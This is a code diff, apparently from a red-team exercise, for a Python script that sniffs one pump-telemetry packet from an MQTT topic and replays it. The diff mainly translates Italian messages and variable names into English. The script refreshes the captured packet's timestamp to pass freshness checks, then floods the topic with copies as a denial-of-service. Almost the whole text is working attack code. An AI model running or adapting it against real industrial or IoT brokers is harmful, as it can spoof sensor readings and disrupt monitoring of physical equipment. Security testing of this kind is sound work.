@@ -22,59 +22,59 @@ def main():
     parser.add_argument("--max-packets", type=int, default=0, help="Optional max packets (0 = until Ctrl+C)")
     args = parser.parse_args()
 
-    state = {"payload_rubato": None}
+    state = {"captured_payload": None}
 
     def on_connect(client, userdata, flags, rc):
         if rc == 0:
-            print("🔴 Red Team: Connesso! Avvio fase di sniffing & replay...")
+            print("[RED TEAM] Connected! Starting passive sniffing & replay phase...")
             client.subscribe(args.topic)
         else:
-            print(f"Errore connessione: {rc}")
+            print(f"[ERROR] MQTT connection failed (rc={rc})")
 
     def on_message(client, userdata, msg):
-        if state["payload_rubato"] is None:
+        if state["captured_payload"] is None:
             try:
                 captured = json.loads(msg.payload.decode("utf-8"))
-                state["payload_rubato"] = captured
-                print("🎯 [SNIFFER] Pacchetto intercettato con successo!")
-                print(f"    -> RPM Attuali rilevati: {captured['sensori']['S1_Pompa_RPM']}")
+                state["captured_payload"] = captured
+                print("[SNIFFER] Baseline telemetry packet captured successfully!")
+                print(f"    -> Observed current RPM: {captured['sensori']['S1_Pompa_RPM']}")
             except (json.JSONDecodeError, KeyError, UnicodeDecodeError) as exc:
-                print(f"[SNIFFER] Ignorato pacchetto non valido: {exc}")
+                print(f"[SNIFFER] Ignored invalid packet: {exc}")
 
     # Single MQTT client handle across sniffing and replay (properly stopped on exit)
-    client = create_mqtt_client(client_id="RedTeam_DoS_Attacker")
+    client = create_mqtt_client(client_id="RedTeam_DoS_Attacker", cfg=cfg)
     client.on_connect = on_connect
     client.on_message = on_message
 
-    print(f"Connessione a {args.broker}...")
+    print(f"Connecting to {args.broker}...")
     client.connect(args.broker, args.port, 60)
     client.loop_start()
 
     try:
-        print("🎧 In ascolto per rubare la telemetria di base...")
-        while state["payload_rubato"] is None:
+        print("[LISTEN] Waiting to capture baseline pump telemetry...")
+        while state["captured_payload"] is None:
             time.sleep(0.1)
 
         # Unsubscribe immediately after capture to avoid flooding the attacker receive buffer
         client.unsubscribe(args.topic)
-        payload_rubato = state["payload_rubato"]
+        stolen_payload = state["captured_payload"]
 
-        print("🔥 Avvio bombardamento volumetrico (Replay Attack)...")
+        print("[ATTACK] Launching volumetric replay flood...")
         counter = 0
         while args.max_packets <= 0 or counter < args.max_packets:
             # Update timestamp so the replayed payload passes schema freshness formatting
-            payload_rubato["timestamp"] = datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
-            payload_str = json.dumps(payload_rubato)
+            stolen_payload["timestamp"] = datetime.now().strftime("%Y-%m-%dT%H:%M:%S.%fZ")
+            payload_str = json.dumps(stolen_payload)
             client.publish(args.topic, payload_str, qos=0)
 
             counter += 1
             if counter % 100 == 0:
-                print(f"[+] Inviati {counter} pacchetti fotocopia...")
+                print(f"[+] Sent {counter} replayed telemetry packets...")
             if args.interval > 0:
                 time.sleep(args.interval)
 
     except KeyboardInterrupt:
-        print("\n🛑 Attacco DoS interrotto.")
+        print("\n[STOP] DoS replay attack stopped.")
     finally:
         client.loop_stop()
         client.disconnect()
